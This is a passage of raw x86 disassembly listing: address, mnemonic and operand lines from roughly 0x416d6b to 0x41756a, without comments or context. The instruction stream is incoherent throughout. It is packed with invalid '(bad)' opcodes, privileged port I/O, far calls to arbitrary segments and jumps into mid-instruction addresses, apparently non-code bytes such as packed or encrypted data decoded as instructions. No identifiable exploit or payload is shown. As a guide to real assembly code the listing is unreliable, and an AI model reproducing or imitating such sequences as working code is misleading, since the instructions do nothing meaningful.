  416d6b:	sub    edx,DWORD PTR [edx+0xb66ff2]
  416d71:	in     al,dx
  416d72:	lods   al,BYTE PTR ds:[esi]
  416d73:	jae    0x416d66
  416d75:	inc    DWORD PTR [edx-0x20baf8ef]
  416d7b:	sbb    BYTE PTR [edx-0x64],0xea
  416d7f:	xor    BYTE PTR [esi],cl
  416d81:	sbb    ah,BYTE PTR [ecx]
  416d83:	jne    0x416d85
  416d85:	in     eax,dx
  416d86:	mov    cs,WORD PTR [edx-0x2f45bc07]
  416d8c:	out    dx,al
  416d8d:	jecxz  0x416d35
  416d8f:	call   0x6949:0x27d9c39b
  416d96:	sbb    esi,DWORD PTR [esi-0x7d0e96b9]
  416d9c:	retf   0x46a7
  416d9f:	sahf   
  416da0:	fbstp  TBYTE PTR [ecx+ebx*4]
  416da3:	imul   ebp,DWORD PTR [edx+0x3c],0x99e6e586
  416daa:	or     al,0x61
  416dac:	in     al,dx
  416dad:	ja     0x416d52
  416daf:	arpl   WORD PTR [ebp+0x26],di
  416db2:	mov    edx,0x9be86c43
  416db7:	sub    ebx,ecx
  416db9:	mov    esi,0x6369fa80
  416dbe:	cmp    BYTE PTR [ebx+0x173cf4aa],0x49
  416dc5:	xor    eax,ecx
  416dc7:	sahf   
  416dc8:	mov    edi,DWORD PTR [esi]
  416dca:	mov    ds:0x40a1ffea,al
  416dcf:	test   ebx,esi
  416dd1:	icebp  
  416dd2:	push   0x12c77300
  416dd7:	ds iret 
  416dd9:	mov    WORD PTR [ecx+0xa],?
  416ddc:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dde:	mov    ebp,0x4a71c85
  416de3:	std    
  416de4:	sbb    ah,BYTE PTR [edx+esi*2]
  416de7:	fwait
  416de8:	mov    cl,0xcb
  416dea:	fisttp DWORD PTR [edi]
  416dec:	dec    edx
  416ded:	pushf  
  416dee:	adc    BYTE PTR [edi],ch
  416df0:	les    ebx,FWORD PTR [esp+ebx*1+0x41e32fe7]
  416df7:	call   0x6756:0x3adf338d
  416dfe:	stc    
  416dff:	jno    0x416e60
  416e01:	pusha  
  416e02:	push   edx
  416e03:	xor    esi,edi
  416e05:	jo     0x416e76
  416e07:	aas    
  416e08:	jo     0x416d9f
  416e0a:	dec    eax
  416e0b:	dec    ebp
  416e0c:	lea    ebp,[ebp+ebp*4+0x31]
  416e10:	jl     0x416dd3
  416e12:	cmp    al,BYTE PTR [esp+edx*2+0x2d]
  416e16:	mov    fs,WORD PTR [edi-0x6b2657f3]
  416e1c:	repz mov ebp,0xba2e4997
  416e22:	pop    edx
  416e23:	and    esp,DWORD PTR [ebx+0x7b]
  416e26:	neg    ecx
  416e28:	jmp    0x416dcb
  416e2a:	loope  0x416e66
  416e2c:	sub    DWORD PTR [edx-0xe318a9c],ecx
  416e32:	inc    esi
  416e33:	retf   0x129a
  416e36:	int    0x55
  416e38:	ret    
  416e39:	sar    cl,1
  416e3b:	dec    ebp
  416e3c:	or     dh,dh
  416e3e:	inc    eax
  416e3f:	or     BYTE PTR [edx],0x5d
  416e42:	sbb    DWORD PTR [esi],ebx
  416e44:	sub    eax,0x84c199dc
  416e49:	push   ecx
  416e4a:	mov    ebp,0xa4958c73
  416e4f:	push   ss
  416e50:	push   ebx
  416e51:	ror    BYTE PTR [edx+0x3dd5397a],0x8e
  416e58:	mov    bh,0x97
  416e5a:	test   al,0xcf
  416e5c:	mov    edx,0xff2cd918
  416e61:	es (bad) 
  416e63:	aam    0x15
  416e65:	into   
  416e66:	dec    ebx
  416e67:	and    edx,DWORD PTR [edx-0xe268855]
  416e6d:	xchg   BYTE PTR [ecx+0x3f141d79],dh
  416e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e74:	div    al
  416e76:	add    al,0x62
  416e78:	jae    0x416e13
  416e7a:	mov    eax,ds:0xe045ed15
  416e7f:	ins    DWORD PTR es:[edi],dx
  416e80:	fild   WORD PTR [ebx*2+0x7237d59c]
  416e87:	sahf   
  416e88:	call   0xc7cab302
  416e8d:	in     al,dx
  416e8e:	jmp    DWORD PTR [ebx]
  416e90:	adc    al,0x98
  416e92:	pop    ecx
  416e93:	sub    BYTE PTR [eax-0x7a],ah
  416e96:	cmp    eax,0xc7a718e9
  416e9b:	mov    BYTE PTR [ecx],dl
  416e9d:	or     ebp,ecx
  416e9f:	(bad)  
  416ea0:	dec    esp
  416ea1:	xchg   esp,eax
  416ea2:	jl     0x416ebb
  416ea4:	inc    ecx
  416ea5:	in     eax,dx
  416ea6:	push   0x337ef666
  416eab:	cli    
  416eac:	mov    ebp,0x4d6cbe04
  416eb1:	adc    edx,DWORD PTR [ebx+0x46]
  416eb4:	pusha  
  416eb5:	mov    eax,0x25fcabf9
  416eba:	xchg   ecx,eax
  416ebb:	inc    esi
  416ebc:	lods   al,BYTE PTR ds:[esi]
  416ebd:	mov    di,0xc4f4
  416ec1:	mov    bl,0x8e
  416ec3:	sbb    eax,0xf39a0387
  416ec8:	out    0x6e,eax
  416eca:	cmp    bl,ah
  416ecc:	test   ebx,edi
  416ece:	enter  0xc014,0x37
  416ed2:	or     DWORD PTR [ecx-0x36],esi
  416ed5:	jo     0x416ed4
  416ed7:	ins    DWORD PTR es:[edi],dx
  416ed8:	fsub   DWORD PTR es:[ebp-0x22fb3c2d]
  416ee0:	jge    0x416ec7
  416ee2:	or     ecx,DWORD PTR [esi+edx*8+0x61]
  416ee6:	outs   dx,BYTE PTR ds:[esi]
  416ee7:	fiadd  WORD PTR [eax+0x1b]
  416eea:	jb     0x416f5a
  416eec:	adc    BYTE PTR [esi-0x5a],cl
  416eef:	aad    0x76
  416ef1:	and    cl,bl
  416ef3:	(bad)  
  416ef4:	or     eax,DWORD PTR [eax+0x6b]
  416ef7:	js     0x416e8c
  416ef9:	push   edx
  416efa:	xchg   ecx,eax
  416efb:	neg    DWORD PTR [eax+0x4c]
  416efe:	and    ebp,esp
  416f00:	lods   eax,DWORD PTR ds:[esi]
  416f01:	fwait
  416f02:	in     eax,dx
  416f03:	and    DWORD PTR fs:[esi+0x30],esp
  416f07:	mov    ds:0x58357e33,eax
  416f0c:	(bad)  
  416f0d:	test   al,0x39
  416f0f:	in     eax,0x89
  416f11:	loope  0x416f1f
  416f13:	test   al,0x4e
  416f15:	dec    esp
  416f16:	jg     0x416f1d
  416f18:	inc    esi
  416f19:	xchg   edx,eax
  416f1a:	xchg   edx,eax
  416f1b:	out    0x62,eax
  416f1d:	(bad)  
  416f1e:	adc    bh,ah
  416f20:	daa    
  416f21:	inc    edi
  416f22:	push   ebp
  416f23:	(bad)  
  416f24:	sbb    ah,0xa8
  416f27:	mov    al,0xdc
  416f29:	ud0    esp,DWORD PTR [ecx]
  416f2c:	add    esi,DWORD PTR [eax]
  416f2e:	out    dx,eax
  416f2f:	ins    BYTE PTR es:[edi],dx
  416f30:	call   0x8539:0x43045b9
  416f37:	jbe    0x416efc
  416f39:	fisub  WORD PTR [ebp+ebx*4+0x1b03297d]
  416f40:	xor    eax,0x4c14333c
  416f45:	dec    ebx
  416f46:	push   ecx
  416f47:	xchg   ebp,eax
  416f48:	fist   DWORD PTR [ebp+0x63694891]
  416f4e:	pop    es
  416f4f:	data16 aam 0xdb
  416f52:	daa    
  416f53:	xor    bl,BYTE PTR [eiz*4-0x172298d]
  416f5a:	stos   BYTE PTR es:[edi],al
  416f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f5c:	mov    ds:0xd9aa6d01,al
  416f61:	ss push edx
  416f63:	xchg   esi,eax
  416f64:	repnz in al,dx
  416f66:	ja     0x416f87
  416f68:	pop    ecx
  416f69:	idiv   BYTE PTR [eax+0x48cb035f]
  416f6f:	inc    eax
  416f70:	or     edx,edx
  416f72:	out    0xdb,eax
  416f74:	sbb    al,0xeb
  416f76:	cmc    
  416f77:	push   es
  416f78:	(bad)  
  416f79:	xchg   BYTE PTR ds:0x7262bb66,dh
  416f7f:	add    eax,ebp
  416f81:	inc    eax
  416f82:	fsubr  DWORD PTR [edx]
  416f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f85:	dec    ebp
  416f86:	dec    esp
  416f87:	inc    eax
  416f88:	sub    eax,0x8616c188
  416f8d:	ss repnz (bad) 
  416f90:	pop    esp
  416f91:	fcomp  DWORD PTR [ebx+ecx*8]
  416f94:	lds    eax,FWORD PTR [edx+0x72a5f959]
  416f9a:	xor    al,0x1f
  416f9c:	loope  0x416f22
  416f9e:	ficomp WORD PTR [eax+0x2fb0b677]
  416fa4:	scas   al,BYTE PTR es:[edi]
  416fa5:	test   ecx,edi
  416fa7:	jle    0x416fff
  416fa9:	in     al,dx
  416faa:	mov    cl,0xfc
  416fac:	imul   ecx,esp,0xffffffb2
  416faf:	cmp    al,0x6a
  416fb1:	ss jp  0x417007
  416fb4:	jmp    0x58bcf806
  416fb9:	leave  
  416fba:	fcmovnbe st,st(3)
  416fbc:	inc    ebx
  416fbd:	pop    edi
  416fbe:	xchg   ecx,eax
  416fbf:	dec    ebx
  416fc0:	test   al,0x3a
  416fc2:	pop    ss
  416fc3:	sti    
  416fc4:	or     ecx,DWORD PTR [eax+eiz*8]
  416fc7:	out    0xb9,eax
  416fc9:	int3   
  416fca:	push   edx
  416fcb:	mov    BYTE PTR [edi+0x2204035a],bl
  416fd1:	mov    dh,0x6f
  416fd3:	out    0x2,eax
  416fd5:	aas    
  416fd6:	xlat   BYTE PTR ds:[ebx]
  416fd7:	cwde   
  416fd8:	hlt    
  416fd9:	dec    esi
  416fda:	push   esi
  416fdb:	xchg   DWORD PTR [esi+0x47068b1],esi
  416fe1:	pop    ss
  416fe2:	mov    ds,WORD PTR [esi]
  416fe4:	push   esp
  416fe5:	sub    DWORD PTR [ebx+0x1ba941c4],edx
  416feb:	int3   
  416fec:	loop   0x417056
  416fee:	imul   esp,edi,0x859664f5
  416ff4:	dec    esi
  416ff5:	repnz cmp bh,BYTE PTR [edi+0x7777ec21]
  416ffc:	push   eax
  416ffd:	sbb    ecx,edi
  416fff:	adc    DWORD PTR [ebx+esi*1+0x30],0x3e263324
  417007:	sbb    eax,0xa247398c
  41700c:	mov    ds,WORD PTR [edi*4+0x3b953a9d]
  417013:	(bad)  
  417014:	push   DWORD PTR [edx+0x1d01871f]
  41701a:	popf   
  41701b:	mov    ebx,0xa104025f
  417020:	clc    
  417021:	xor    eax,0x9d9a0d5a
  417026:	mov    dh,BYTE PTR ss:[eax+ebp*4-0x43]
  41702b:	jle    0x417009
  41702d:	neg    DWORD PTR [eax-0x3053ea49]
  417033:	mov    WORD PTR [edi+0x3e],ss
  417036:	(bad)  
  417037:	push   eax
  417038:	jno    0x41704e
  41703a:	or     esi,DWORD PTR [esi-0x7e73b920]
  417040:	xchg   BYTE PTR [edx+0x15],dl
  417043:	in     eax,0xfa
  417045:	xor    eax,0xa69974aa
  41704a:	stc    
  41704b:	cli    
  41704c:	in     al,0xde
  41704e:	daa    
  41704f:	je     0x41704c
  417051:	ficomp DWORD PTR [ebx+edx*1-0x19]
  417055:	ds add al,0xd
  417059:	and    ah,BYTE PTR [edx-0x53787348]
  41705f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417060:	mov    ebp,0xdf01cf5a
  417065:	dec    edx
  417066:	arpl   WORD PTR [ebx],di
  417068:	shl    DWORD PTR [esi+0x15],0x7b
  41706c:	push   edx
  41706d:	out    dx,eax
  41706e:	addr16 aas 
  417070:	mov    ch,0xe2
  417072:	lods   al,BYTE PTR ds:[esi]
  417073:	fwait
  417074:	and    esi,DWORD PTR [ecx]
  417076:	sahf   
  417077:	sub    BYTE PTR [eax],dl
  417079:	jae    0x4170be
  41707b:	rcr    DWORD PTR [ebx+0x34],cl
  41707e:	fidivr WORD PTR [esp+ecx*8]
  417081:	cmp    BYTE PTR [edx],ah
  417083:	inc    edx
  417084:	dec    esp
  417085:	lock ss stos DWORD PTR es:[edi],eax
  417088:	test   BYTE PTR [ebp-0x43],0x7e
  41708c:	xchg   ah,dh
  41708e:	xor    al,0xc0
  417090:	inc    edi
  417091:	ds loopne 0x4170f5
  417094:	pop    esp
  417095:	or     al,0x61
  417097:	xchg   ebx,eax
  417098:	fisub  DWORD PTR [ebp+0x35370538]
  41709e:	pushf  
  41709f:	sar    DWORD PTR [ebx+ebp*8],0x33
  4170a3:	ror    BYTE PTR ds:0x9a6cf961,0x6b
  4170aa:	cli    
  4170ab:	shr    DWORD PTR [ebx-0x190822fc],0x90
  4170b2:	add    al,0x68
  4170b4:	sbb    dl,BYTE PTR [edi]
  4170b6:	push   DWORD PTR [eax+0x1cba7e10]
  4170bc:	cmp    al,0x95
  4170be:	lock jmp 0xee14eba7
  4170c4:	push   0x73bc0ba5
  4170c9:	xchg   esi,eax
  4170ca:	jg     0x417055
  4170cc:	cdq    
  4170cd:	or     BYTE PTR [edi+0x5d669379],0x53
  4170d4:	mov    al,0x87
  4170d6:	pop    esi
  4170d7:	adc    eax,0x875ff838
  4170dc:	fcmove st,st(3)
  4170de:	or     DWORD PTR [ebp-0x32],0x35bcbc15
  4170e5:	and    eax,0xfe9dc578
  4170ea:	int3   
  4170eb:	imul   edi,DWORD PTR [ebx],0x7a
  4170ee:	adc    al,0xc4
  4170f0:	out    0x58,eax
  4170f2:	daa    
  4170f3:	aaa    
  4170f4:	out    dx,al
  4170f5:	push   0xecbed42d
  4170fa:	outs   dx,DWORD PTR ds:[esi]
  4170fb:	mov    ds:0x5338e388,eax
  417100:	mov    ds:0x9b45eef2,al
  417105:	xlat   BYTE PTR ds:[ebx]
  417106:	jae    0x41717f
  417108:	pop    ebp
  417109:	mov    ecx,0x342c26a6
  41710e:	dec    ebp
  41710f:	mov    edx,0x9f4c92f9
  417114:	push   edi
  417115:	dec    ecx
  417116:	imul   ecx,DWORD PTR [ebx+0x5d],0x5d
  41711a:	(bad)
  41711d:	jg     0x4170cf
  41711f:	shl    al,0xc8
  417122:	dec    ebx
  417123:	mov    al,ds:0x2293ae00
  417128:	or     DWORD PTR [edi-0x50ce6b00],esp
  41712e:	in     al,dx
  41712f:	pop    edx
  417130:	fdiv   st(4),st
  417132:	mov    BYTE PTR [ecx+0x1c],dl
  417135:	add    eax,0xec1cfb0f
  41713a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41713b:	out    0x8c,al
  41713d:	dec    esp
  41713e:	std    
  41713f:	popf   
  417140:	(bad)  
  417142:	dec    edi
  417143:	icebp  
  417144:	pop    esp
  417145:	mov    eax,0xfe1afd87
  41714a:	cwde   
  41714b:	jmp    0xaf16:0x3c84f159
  417152:	test   eax,0xd1bd5fca
  417157:	scas   al,BYTE PTR es:[edi]
  417158:	push   0x2c29cdad
  41715d:	fs pop es
  41715f:	add    DWORD PTR [esp+eiz*8],0xffffffc8
  417163:	cmp    bh,BYTE PTR ds:0x487425fc
  417169:	out    dx,eax
  41716a:	add    al,0xf8
  41716c:	xchg   ebx,eax
  41716d:	push   edx
  41716e:	scas   eax,DWORD PTR es:[edi]
  41716f:	push   ebp
  417170:	ffree  st(0)
  417172:	test   BYTE PTR [edi],ch
  417174:	data16 jge 0x4171b7
  417177:	mov    eax,ds:0x5486117f
  41717c:	push   esp
  41717d:	jae    0x4171b8
  41717f:	jno    0x417116
  417181:	add    eax,0x32f6eb5f
  417186:	mov    bl,0xd5
  417188:	arpl   WORD PTR [ebx+0x59],bp
  41718b:	jnp    0x41716d
  41718d:	or     BYTE PTR [edx],bh
  41718f:	sub    BYTE PTR ds:0x20564614,0xf
  417196:	mov    ds:0x5255cb53,al
  41719b:	jne    0x4171e5
  41719d:	push   edx
  41719e:	fs retf 
  4171a0:	outs   dx,DWORD PTR ds:[esi]
  4171a1:	(bad)  
  4171a2:	in     al,dx
  4171a3:	push   edi
  4171a4:	mov    BYTE PTR [ebx+eax*1-0x25688a96],dh
  4171ab:	add    al,0x2b
  4171ad:	xchg   ecx,eax
  4171ae:	dec    ebp
  4171af:	dec    DWORD PTR [edi-0xe8295b8]
  4171b5:	sub    DWORD PTR [ebx-0x14ab0be],0xffffffa8
  4171bc:	jecxz  0x4171d5
  4171be:	sbb    WORD PTR gs:[edi],bp
  4171c2:	das    
  4171c3:	(bad)  
  4171c5:	aas    
  4171c6:	push   eax
  4171c7:	inc    esi
  4171c8:	pushf  
  4171c9:	cmc    
  4171ca:	les    ebp,FWORD PTR [ebp-0x3b6ea735]
  4171d0:	sti    
  4171d1:	pop    edi
  4171d2:	sbb    esi,DWORD PTR [ebx]
  4171d4:	pop    ds
  4171d5:	dec    esi
  4171d6:	stos   BYTE PTR es:[edi],al
  4171d7:	repnz xor eax,0x293c5919
  4171dd:	fist   WORD PTR [esp+edx*1+0x13]
  4171e1:	and    ebx,esi
  4171e3:	mov    eax,0x32b321d2
  4171e8:	jecxz  0x4171cf
  4171ea:	leave  
  4171eb:	dec    ecx
  4171ec:	popf   
  4171ed:	mov    ds:0x20771477,al
  4171f2:	outs   dx,DWORD PTR ds:[esi]
  4171f3:	mov    WORD PTR [edx-0x1],gs
  4171f6:	cmp    dh,al
  4171f8:	dec    eax
  4171f9:	mov    DWORD PTR [esi+0x5c],0xd18abb6a
  417200:	mov    ch,0x55
  417202:	clc    
  417203:	jp     0x417260
  417205:	lods   al,BYTE PTR ds:[esi]
  417206:	retf   
  417207:	push   esp
  417208:	ds loope 0x4171ba
  41720b:	jbe    0x41723e
  41720d:	hlt    
  41720e:	nop
  41720f:	xor    ecx,ebp
  417211:	push   0xffffffcb
  417213:	xchg   DWORD PTR [ebp+0x35],ebp
  417216:	xlat   BYTE PTR ds:[ebx]
  417217:	mov    bl,0x41
  417219:	jl     0x417213
  41721b:	jg     0x41723e
  41721d:	mov    DWORD PTR [edi+edi*8+0x507c8dfe],ebx
  417224:	shl    BYTE PTR [ebp-0x39772da6],1
  41722a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41722b:	xchg   DWORD PTR [ebx+0x5b5ed495],ebp
  417231:	arpl   bx,bx
  417233:	jbe    0x417241
  417235:	(bad)  
  417236:	repz aad 0x9
  417239:	sbb    edi,DWORD PTR [edi]
  41723b:	mov    WORD PTR [edi],?
  41723d:	in     eax,dx
  41723e:	scas   al,BYTE PTR es:[edi]
  41723f:	cmc    
  417240:	inc    ebp
  417241:	dec    edx
  417243:	fs mov ebx,0x3b5cccaa
  417249:	inc    esp
  41724a:	ror    BYTE PTR [ebx-0x765f7162],1
  417250:	pop    ecx
  417251:	(bad)  
  417252:	repz dec ebx
  417254:	mov    dh,0x6a
  417256:	es jl  0x41726a
  417259:	adc    eax,0xc00daaa7
  41725e:	dec    edx
  41725f:	inc    esi
  417260:	out    dx,eax
  417261:	pop    es
  417262:	stos   BYTE PTR es:[edi],al
  417263:	jb     0x41728c
  417265:	cs jne 0x41729a
  417268:	inc    esp
  417269:	pushf  
  41726a:	sbb    eax,0x3f128fef
  41726f:	adc    BYTE PTR [eax-0x12],0xc3
  417273:	mov    esp,0x2e776187
  417278:	mov    dh,0x18
  41727a:	hlt    
  41727b:	loope  0x417285
  41727d:	sub    DWORD PTR [edi-0x1e7f2821],ecx
  417283:	nop
  417284:	test   DWORD PTR [ecx+0x510b80ff],0x925edfe6
  41728e:	jns    0x4172df
  417290:	mov    ebx,0x3819f174
  417295:	lock jp 0x4172e9
  417298:	test   BYTE PTR ds:0x45f50d05,0x58
  41729f:	and    eax,0x36669c4f
  4172a4:	xchg   edi,eax
  4172a5:	push   0xe029cfbd
  4172aa:	loopne 0x4172b5
  4172ac:	xor    al,0x32
  4172ae:	jno    0x417259
  4172b0:	ins    BYTE PTR es:[edi],dx
  4172b1:	adc    eax,0x98d7a698
  4172b6:	retf   0x676c
  4172b9:	mov    bl,BYTE PTR [edi+edx*8]
  4172bc:	sbb    eax,0xa1975377
  4172c1:	aam    0xe9
  4172c3:	pop    ss
  4172c4:	mov    esp,0x49daab15
  4172c9:	sbb    DWORD PTR [ecx-0x3b],esp
  4172cc:	adc    esi,DWORD PTR [ebp-0x29]
  4172cf:	adc    DWORD PTR [esp+eiz*4],edx
  4172d2:	push   edx
  4172d3:	cwde   
  4172d4:	int3   
  4172d5:	in     eax,0x66
  4172d7:	jle    0x4172c5
  4172d9:	sbb    eax,0x61a22277
  4172de:	dec    eax
  4172df:	push   ss
  4172e0:	in     al,0xdf
  4172e2:	dec    esp
  4172e3:	test   al,cl
  4172e5:	in     eax,dx
  4172e6:	fdiv   QWORD PTR [ebx+0x7ffa7155]
  4172ec:	xor    al,0xb6
  4172ee:	enter  0xdefd,0x54
  4172f2:	popf   
  4172f3:	mov    dl,0x4e
  4172f5:	mov    ah,0x16
  4172f7:	int3   
  4172f8:	mov    bh,0xc9
  4172fa:	push   eax
  4172fb:	retw   0x27b6
  4172ff:	or     eax,0xbce49ed5
  417304:	out    dx,al
  417305:	jns    0x417353
  417307:	xchg   edx,eax
  417308:	mov    cl,0x7f
  41730a:	rol    DWORD PTR [esi+0x1b745254],1
  417310:	(bad)
  417315:	(bad)  
  417316:	retf   
  417317:	ja     0x41732b
  417319:	iret   
  41731a:	add    al,0xc9
  41731c:	(bad)  
  41731d:	(bad)  
  41731e:	outs   dx,BYTE PTR ds:[esi]
  41731f:	es push esp
  417321:	pop    esi
  417322:	nop
  417323:	repz push cs
  417325:	pop    DWORD PTR [ebx]
  417327:	add    ebx,DWORD PTR [ebp+0x3aad3be9]
  41732d:	(bad)  
  41732e:	out    0x8a,al
  417330:	fist   DWORD PTR [esp+ebp*1+0x1a]
  417334:	xor    BYTE PTR [esp+edi*1+0x23bf8f35],al
  41733b:	mov    ebx,0xd9b0cae7
  417340:	fs mov ebp,0x4cdb458f
  417346:	xor    BYTE PTR [edx+0x44],cl
  417349:	ds pop ebx
  41734b:	pop    esp
  41734c:	das    
  41734d:	in     eax,dx
  41734e:	(bad)  
  41734f:	cmp    ecx,DWORD PTR [esi]
  417351:	adc    DWORD PTR [esi+0x45],ebp
  417354:	inc    eax
  417355:	jmp    0x417321
  417357:	mov    eax,0x4b339405
  41735c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41735d:	shl    DWORD PTR [edi-0x40],1
  417360:	cmp    al,0x9a
  417362:	pop    eax
  417363:	mov    al,0x46
  417365:	lods   eax,DWORD PTR ds:[esi]
  417366:	or     eax,0x94a2f5f
  41736b:	sbb    eax,0x7436a47b
  417370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417371:	xchg   edx,eax
  417372:	mov    ebx,0x414e0d9e
  417377:	sub    ebp,ecx
  417379:	adc    eax,DWORD PTR [esi+0x66823ba1]
  41737f:	scas   eax,DWORD PTR es:[edi]
  417380:	pop    ss
  417381:	push   ss
  417382:	inc    BYTE PTR [ebp-0x63ff537b]
  417388:	fpatan 
  41738a:	dec    ebp
  41738b:	sahf   
  41738c:	or     BYTE PTR [ecx+0x1a1362b5],al
  417392:	mov    eax,0xe1d93818
  417397:	pop    es
  417398:	aad    0x8a
  41739a:	ins    BYTE PTR es:[edi],dx
  41739b:	pop    eax
  41739c:	sbb    DWORD PTR [ebp-0x844db9b],0x7b
  4173a3:	sub    dh,cl
  4173a5:	in     al,dx
  4173a6:	pop    ss
  4173a7:	xlat   BYTE PTR ds:[ebx]
  4173a8:	xchg   WORD PTR [edx+0x4c],bx
  4173ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173ad:	pusha  
  4173ae:	sbb    al,0x71
  4173b0:	xor    DWORD PTR [edx],ebx
  4173b2:	test   BYTE PTR [edi],0x48
  4173b5:	ins    DWORD PTR es:[edi],dx
  4173b6:	data16 scas al,BYTE PTR es:[edi]
  4173b8:	stc    
  4173b9:	out    0x12,eax
  4173bb:	push   ebp
  4173bc:	loopne 0x417376
  4173be:	sbb    eax,0x2f2f763a
  4173c3:	into   
  4173c4:	repz dec edx
  4173c6:	neg    BYTE PTR [esi+0x6e]
  4173c9:	sbb    bh,BYTE PTR [edi+0x1f2c81bf]
  4173cf:	cli    
  4173d0:	xchg   edi,eax
  4173d1:	sbb    eax,0x5b02b260
  4173d6:	popf   
  4173d7:	ds sub eax,0x4669eb72
  4173dd:	sub    eax,0xb8e43bd2
  4173e2:	daa    
  4173e3:	hlt    
  4173e4:	sbb    esp,edi
  4173e6:	cdq    
  4173e7:	inc    ebx
  4173e8:	addr16 mov esi,0x76a8e35e
  4173ee:	mov    WORD PTR [edx+0x1b8b429d],gs
  4173f4:	mov    DWORD PTR [edx],eax
  4173f6:	ud1    ecx,DWORD PTR [esi-0x57a41b63]
  4173fd:	and    esi,DWORD PTR [esi+edx*8+0x12dc63fc]
  417404:	or     ebx,edx
  417406:	xchg   ebp,eax
  417407:	inc    ebx
  417408:	add    BYTE PTR ds:0xff03e083,0x7d
  41740f:	pop    ebx
  417410:	stc    
  417411:	mov    ebx,gs
  417413:	dec    eax
  417414:	sbb    DWORD PTR [edi+0x5bb0235b],edx
  41741a:	add    ebp,eax
  41741c:	mov    WORD PTR [ebx+0x3b5dafba],?
  417422:	jbe    0x4173ba
  417424:	push   0xffffffcc
  417426:	enter  0x97e,0x10
  41742a:	int3   
  41742b:	mov    ah,BYTE PTR [ebx+0x79]
  41742e:	cli    
  41742f:	(bad)  
  417430:	dec    ebp
  417431:	mov    ds:0x208fde43,al
  417436:	push   ss
  417437:	adc    bh,ah
  417439:	push   cs
  41743a:	mov    edi,0xb27b2a74
  41743f:	add    al,0x46
  417441:	mov    edx,0x6e87ccf2
  417446:	cmp    edi,DWORD PTR [eax-0x59]
  417449:	sub    DWORD PTR [esp+eax*4],ebp
  41744c:	pop    esp
  41744d:	in     eax,dx
  41744e:	ror    BYTE PTR [ecx],0xc1
  417451:	xchg   edi,eax
  417452:	adc    eax,0xd76b74de
  417457:	imul   edi
  417459:	pop    ebp
  41745a:	fs cwde 
  41745c:	sub    eax,0xe788b3f7
  417461:	pop    edx
  417462:	jns    0x41747e
  417464:	inc    esi
  417465:	je     0x4173f5
  417467:	setp   BYTE PTR [edx]
  41746a:	ret    0x8812
  41746d:	sub    al,0x60
  41746f:	lds    esi,FWORD PTR [eax-0x45]
  417472:	(bad)  
  417473:	icebp  
  417474:	lods   al,BYTE PTR ds:[esi]
  417475:	add    ch,cl
  417477:	xor    esp,edx
  417479:	jno    0x417453
  41747b:	ja     0x4174eb
  41747d:	dec    eax
  41747e:	and    DWORD PTR [ebp+0x53b5fc4b],ebx
  417484:	test   BYTE PTR [eax-0x64],bh
  417487:	inc    ebp
  417488:	pop    es
  417489:	enter  0x8640,0x74
  41748d:	pop    es
  41748e:	push   ds
  41748f:	cdq    
  417490:	jmp    0x41743d
  417492:	fucom  st(7)
  417494:	repz stc 
  417496:	or     eax,0xdf762875
  41749b:	in     eax,0x85
  41749d:	aam    0x60
  41749f:	push   ss
  4174a0:	xchg   edi,eax
  4174a1:	push   edx
  4174a2:	stos   BYTE PTR es:[edi],al
  4174a3:	push   ebx
  4174a4:	lock cmp esi,edx
  4174a7:	nop
  4174a8:	mov    eax,ds:0x70f7f50
  4174ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ae:	push   edx
  4174af:	in     eax,0x17
  4174b1:	jae    0x41750c
  4174b3:	imul   esi,DWORD PTR [ebp-0x20],0xc434fa93
  4174ba:	int    0xd3
  4174bc:	pushf  
  4174bd:	in     al,dx
  4174be:	fisub  WORD PTR [edi-0x13cbc540]
  4174c4:	cli    
  4174c5:	sbb    ch,BYTE PTR [ebx+esi*4+0x5b14060a]
  4174cc:	addr16 inc ebp
  4174ce:	mov    ds:0x20520ae6,al
  4174d3:	stos   BYTE PTR es:[edi],al
  4174d4:	and    al,0xe5
  4174d6:	jbe    0x41752e
  4174d8:	rcl    DWORD PTR [eax+0x4d],1
  4174db:	xchg   esi,eax
  4174dc:	mov    edx,0xa9b9999e
  4174e1:	adc    eax,0xaaf14f20
  4174e6:	in     eax,dx
  4174e7:	push   esi
  4174e8:	retf   
  4174e9:	add    DWORD PTR [ebp+0x7c808a78],0x7b
  4174f0:	jb     0x4174eb
  4174f2:	xlat   BYTE PTR ds:[ebx]
  4174f3:	push   ecx
  4174f4:	aad    0x8f
  4174f6:	push   ecx
  4174f7:	and    BYTE PTR [esi+0x3d2a4361],bl
  4174fd:	in     eax,dx
  4174fe:	xchg   ecx,eax
  4174ff:	mov    cl,0x6e
  417501:	sbb    BYTE PTR [ebp-0x6d1c7282],dh
  417507:	jnp    0x4174c5
  417509:	leave  
  41750a:	call   0xc7b4:0xaafa661f
  417511:	not    ah
  417513:	outs   dx,BYTE PTR ds:[esi]
  417514:	aad    0x7f
  417516:	sbb    ah,BYTE PTR [ecx+0x35b4e2f]
  41751c:	in     eax,0x5a
  41751e:	inc    ebx
  41751f:	xor    al,0x5e
  417521:	jmp    0xe1f61abe
  417526:	js     0x964ac89d
  41752c:	int3   
  41752d:	je     0x41751b
  41752f:	aad    0xce
  417531:	out    dx,al
  417532:	das    
  417533:	xchg   esp,esi
  417535:	int    0x2
  417537:	cld    
  417538:	paddusw mm3,QWORD PTR [esi+0x5b]
  41753c:	addr16 cwde 
  41753e:	iret   
  41753f:	jp     0x41750e
  417541:	cwde   
  417542:	push   edi
  417543:	mov    bh,0x1b
  417545:	dec    esp
  417546:	or     al,0x84
  417548:	jae    0x4174f8
  41754a:	ja     0x417520
  41754c:	xchg   ecx,eax
  41754d:	mov    al,ds:0xc7f12c33
  417552:	mov    eax,0xd4459a21
  417557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417558:	xor    DWORD PTR [ecx+0x6f],0xfffffff0
  41755c:	cld    
  41755d:	fld    QWORD PTR [esi+0x5c]
  417560:	mov    edx,0xbb905039
  417565:	mov    al,ds:0x633b8d73
  41756a:	xchg   si,ax
